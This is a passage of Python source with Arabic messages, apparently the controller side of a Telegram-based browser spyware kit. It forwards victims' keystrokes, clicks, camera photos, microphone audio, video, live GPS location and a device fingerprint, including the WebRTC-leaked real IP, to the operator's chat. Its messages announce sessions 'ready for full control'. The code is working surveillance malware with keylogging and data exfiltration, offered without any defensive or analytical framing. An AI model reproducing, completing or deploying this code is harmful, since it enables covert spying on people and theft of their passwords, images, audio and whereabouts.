                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(chat_id, f"📍 **الموقع المحدّث:** `{lat}, {lng}`\n[خرائط](https://maps.google.com/?q={lat},{lng})", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "❌ تعذّر تحديث الموقع")
        elif dtype == 'command_redirect_ack':
            bot.send_message(chat_id, "✅ تم إنهاء الجلسة")
        elif dtype == 'ready':
            bot.send_message(chat_id, f"✅ **الجلسة جاهزة للتحكم الكامل**")
        elif dtype == 'pong':
            pass
    except Exception as e:
        print(f"[-] _handle_incoming error ({dtype}): {e}")
        import traceback
        traceback.print_exc()


# ============================================================
# [8] إرسال الوسائط
# ============================================================
def _send_photo(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:image'):
            return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.jpg'
        bot.send_photo(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_photo error: {e}")


def _send_audio(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:audio'):
            return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.webm'
        bot.send_audio(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_audio error: {e}")


def _send_video(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:video'):
            return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.webm'
        bot.send_video(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_video error: {e}")


# ============================================================
# [9] تجميعات
# ============================================================
_key_buffers = {}
_click_buffers = {}
_BOT_REF = None


def set_bot_reference(bot):
    global _BOT_REF
    _BOT_REF = bot


def _accumulate_key(chat_id, session_id, key):
    now = time.time()
    key_map = {'Enter': ' ⏎ ', 'Backspace': '⌫', 'Delete': '⌦', 'Tab': ' ⇥ ',
               'Escape': '⎋', 'ArrowUp': '↑', 'ArrowDown': '↓',
               'ArrowLeft': '←', 'ArrowRight': '→'}
    display = key_map.get(key, key)
    buf = _key_buffers.setdefault(chat_id, {"text": "", "last": 0})
    buf["text"] += display
    if now - buf["last"] > 4 or len(buf["text"]) > 180:
        if buf["text"].strip() and _BOT_REF:
            try:
                _BOT_REF.send_message(chat_id, f"⌨️ **لوحة المفاتيح:**\n```\n{buf['text'][:500]}\n```", parse_mode="Markdown")
            except Exception: pass
        buf["text"] = ""
        buf["last"] = now


def _accumulate_click(chat_id, session_id, text):
    now = time.time()
    buf = _click_buffers.setdefault(chat_id, {"texts": [], "last": 0})
    buf["texts"].append(text)
    if now - buf["last"] > 6 or len(buf["texts"]) >= 8:
        if _BOT_REF and buf["texts"]:
            try:
                unique = list(dict.fromkeys(buf["texts"]))[:8]
                _BOT_REF.send_message(chat_id, "🖱️ **النقرات:**\n" + "\n".join(f"• {t[:70]}" for t in unique), parse_mode="Markdown")
            except Exception: pass
        buf["texts"] = []
        buf["last"] = now


# ============================================================
# [10] تقرير
# ============================================================
def _format_info_report(info, session_id):
    bat = info.get('battery') or {}
    net = info.get('connection') or {}
    scr = info.get('screen') or {}
    hw = info.get('hardware') or {}
    gpu = info.get('gpu') or {}
    webrtc = info.get('webrtc_ips', [])
    ip = info.get('ip', 'Unknown')
    webrtc_text = "، ".join(webrtc) if webrtc else "لا يوجد"
    return (
        "╔══════════════════════════════╗\n"
        "║  🎯 **جلسة LSH جديدة**  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🌐 **IP:** `{ip}`\n"
        f"🕵️ **IP الحقيقي (WebRTC):** `{webrtc_text}`\n"
        f"🕐 `{info.get('timestamp', 'N/A')[:19]}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💻 **الجهاز:**\n"
        f"• المنصة: `{info.get('platform', 'Unknown')}`\n"
        f"• المعالج: `{hw.get('cores', 'N/A')} أنوية`\n"
        f"• الذاكرة: `{hw.get('memory', 'N/A')} GB`\n"
        f"• اللغة: `{info.get('language', 'N/A')}`\n"
        f"• التوقيت: `{info.get('timezone', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 **كرت الرسوميات:**\n"
        f"• `{gpu.get('vendor', 'N/A')}`\n"
        f"• `{gpu.get('renderer', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📐 **الشاشة:**\n"
        f"• `{scr.get('width', '?')}x{scr.get('height', '?')}` DPR `{scr.get('pixelRatio', '?')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔋 **البطارية:** "
        + (f"`{bat.get('level', '?')}%`" if bat else "غير متاح") + "\n"
        "📶 **الشبكة:** "
        + (f"`{net.get('effectiveType', '?')}`" if net else "غير متاح")
            )
